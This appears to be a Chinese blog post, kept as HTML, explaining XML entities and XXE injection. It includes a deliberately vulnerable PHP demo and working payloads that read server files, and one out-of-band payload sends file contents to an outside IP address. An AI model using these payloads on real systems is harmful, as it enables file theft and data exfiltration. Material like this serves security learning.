@@ -1,0 +1,352 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Khaz | Khaz</title><meta name="author" content="Khaz"><meta name="copyright" content="Khaz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XML基础 定义  XML是可扩展标记语言（eXtensible Markup Language）的缩写，它是是一种数据表示格式，可以描述非常 复杂的数据结构，常用于传输和存储数据。   与html的联系和区别  HTML 被设计用来显示数据 XML 被设计用来传输和存储数据   对 XML 最好的描述是： XML 是独立于软件和硬件的信息传输工具。   语法   格式  XML声明：版本，编码信">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Khaz">
+<meta property="og:url" content="http://fgtbnc.github.io/2023/06/06/XXE/index.html">
+<meta property="og:site_name" content="Khaz">
+<meta property="og:description" content="XML基础 定义  XML是可扩展标记语言（eXtensible Markup Language）的缩写，它是是一种数据表示格式，可以描述非常 复杂的数据结构，常用于传输和存储数据。   与html的联系和区别  HTML 被设计用来显示数据 XML 被设计用来传输和存储数据   对 XML 最好的描述是： XML 是独立于软件和硬件的信息传输工具。   语法   格式  XML声明：版本，编码信">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fgtbnc.github.io/images/wallhaven-yxe8kk.jpg">
+<meta property="article:published_time" content="2023-06-06T06:53:08.368Z">
+<meta property="article:modified_time" content="2023-06-06T06:57:29.725Z">
+<meta property="article:author" content="Khaz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fgtbnc.github.io/images/wallhaven-yxe8kk.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://fgtbnc.github.io/2023/06/06/XXE/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":250},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Khaz","link":"链接: ","source":"来源: Khaz","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Khaz',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-06-06 14:57:29'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom/beauty.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s1.ax1x.com/2023/05/31/p9x0Eg1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://fgtbnc.github.io/images/wallhaven-yxe8kk.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Khaz</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-06T06:53:08.368Z" title="发表于 2023-06-06 14:53:08">2023-06-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-06T06:57:29.725Z" title="更新于 2023-06-06 14:57:29">2023-06-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ol>
+<li><p>定义</p>
+<blockquote>
+<p>XML是可扩展标记语言（eXtensible Markup Language）的缩写，它是是一种数据表示格式，可以描述非常 复杂的数据结构，常用于传输和存储数据。</p>
+</blockquote>
+</li>
+<li><p>与html的联系和区别</p>
+<ul>
+<li>HTML 被设计用来显示数据</li>
+<li>XML 被设计用来传输和存储数据</li>
+</ul>
+<blockquote>
+<p>对 XML 最好的描述是：</p>
+<p><strong>XML 是独立于软件和硬件的信息传输工具。</strong></p>
+</blockquote>
+</li>
+<li><p>语法</p>
+<p><img src="/../images/image-20220804165043284-1686034515882.png" alt="image-20220804165043284"></p>
+</li>
+<li><p>格式</p>
+<ul>
+<li><p>XML声明：版本，编码信息（可选，如果存在就必须放在文档的首行）</p>
+</li>
+<li><p>DTD:Document Type Definition 即文档类型定义 (可选)</p>
+</li>
+<li><p>文档元素</p>
+</li>
+<li><p>典型xml文档例子</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20220804155703432-1686034515883.png" alt="image-20220804155703432"></p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="DTD与实体"><a href="#DTD与实体" class="headerlink" title="DTD与实体"></a>DTD与实体</h2><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><blockquote>
+<p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面所示的就是一个DTD</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY b system &quot;外部dtd地址&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面所示的就是一个外部DTD</p>
+<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><blockquote>
+<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">	&lt;!ENTITY hello &quot;hello world&quot; &gt; </span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&amp;hello&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文档元素可以使用&amp;来引用实体的值，<code>&amp;hello</code>将被替换为<code>hello world</code></p>
+<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>XML参数实体是一种特殊的XML实体，只能在DTD中的其他地方引用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">	&lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;</span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到参数实体用<code>% name</code>声明，引用时用<code>%name;</code></p>
+<h4 id="引入外部实体"><a href="#引入外部实体" class="headerlink" title="引入外部实体"></a>引入外部实体</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">	&lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用了file协议来引入外部实体，实际上还能支持如下协议，这也是xxe漏洞形成的原因</p>
+<p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p>
+<p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p>
+<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>XXE 漏洞发 生在<strong>应用程序解析 XML 输入时</strong>，没有禁止<strong>外部实体</strong>的加载，而外部实体的引用可支持http，file等协议，通过利用这些协议进行攻击。</p>
+<p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p>
+<p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p>
+<p>需要注意的是PHP是使用libxml来解析XML的，但是<strong>libxml2.9.0</strong>开始就默认不解析外部实体，自然就不存在xxe漏洞。</p>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><ul>
+<li><p>数据包中的content-type</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">application/xml</span><br><span class="line">text/xml</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>http body</p>
+<p><img src="/../images/image-20230605180133052-1686034648311.png" alt="image-20230605180133052"></p>
+</li>
+<li><p>数据包请求头中Context-Type的值为application&#x2F;json，更改为application&#x2F;xml或者text&#x2F;xml，然后插入payload测试</p>
+</li>
+</ul>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件读取</span><br><span class="line">内网探针</span><br><span class="line">拒绝服务攻击</span><br><span class="line">命令(代码)执行</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>Demo</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>username</code>为回显位</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;                                                            </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="外带"><a href="#外带" class="headerlink" title="外带"></a>外带</h4><p>php:&#x2F;&#x2F;filter读取对方服务器文件内容→引入外部实体（攻击服务器上的）→触发外部实体中的写入代码，将读取到的文件内容赋值给指定参数→接收参数，在攻击服务器监听或者查看日志，从而获取到对方服务器文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://124.220.192.120:8000/test.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--evil.dtd--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span></span></span><br><span class="line"><span class="meta">	<span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://124.220.192.120:8888/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25（因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>）</p>
+</blockquote>
+<p><img src="/../images/image-20230605192212337.png" alt="image-20230605192212337"></p>
+<h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p>
+<h5 id="引入服务器实体"><a href="#引入服务器实体" class="headerlink" title="引入服务器实体"></a>引入服务器实体</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://ip:8000/xml.dtd&quot;&gt; </span><br><span class="line">    %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>xml.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--通过执行error实体，以便通过尝试加载不存在的文件来带出目标文件的值，从而生成包含不存在文件的名称的错误消息，该文件是/etc/passwd文件的内容--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20230606142023880.png" alt="image-20230606142023880"></p>
+<h5 id="引入本地系统文件"><a href="#引入本地系统文件" class="headerlink" title="引入本地系统文件"></a>引入本地系统文件</h5><p><a target="_blank" rel="noopener" href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % SuperClass &#x27;</span><br><span class="line">         &gt;Your DTD code&lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD code</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % SuperClass &#x27;&gt;</span><br><span class="line">         &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error; &lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本地windows测试失败</p>
+<h5 id="嵌套参数实体"><a href="#嵌套参数实体" class="headerlink" title="嵌套参数实体"></a>嵌套参数实体</h5><p>不是所有的xml解析器都能解析嵌套参数实体</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///e:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20230605210541295.png" alt="image-20230605210541295"></p>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///文件路径&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!-- 使用php的filter过滤器读取含有xml保留字符的文件 --&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY  rabbit SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;]&gt; </span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20230605193428910.png" alt="image-20230605193428910"></p>
+<p>当不能使用过滤器时</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///f:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br></pre></td></tr></table></figure>
+
+<p>evil.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>POST数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &amp;all是使用evil.dtd中的实体--&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20230605204320348.png" alt="image-20230605204320348"></p>
